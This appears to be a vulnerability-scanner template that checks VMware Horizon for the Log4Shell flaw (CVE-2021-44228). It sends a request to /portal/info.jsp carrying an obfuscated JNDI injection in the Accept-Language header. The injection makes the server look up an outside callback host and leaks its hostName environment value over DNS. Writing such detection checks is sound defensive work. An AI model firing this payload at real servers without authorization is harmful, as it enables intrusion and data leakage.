id: vmware-horizon-log4j-jndi-rce
info:
  author: johnk3r
  description: A critical vulnerability in Apache Log4j identified by CVE-2021-44228
    has been publicly disclosed that may allow for remote code execution in impacted
    VMware Horizon.
  name: VMware Horizon Log4j JNDI RCE
  reference:
  - https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis
  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  severity: high
  tags: rce,jndi,log4j,horizon,vmware
requests:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET /portal/info.jsp HTTP/1.1

    Host: {{Hostname}}

    Accept-Language: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}

    '
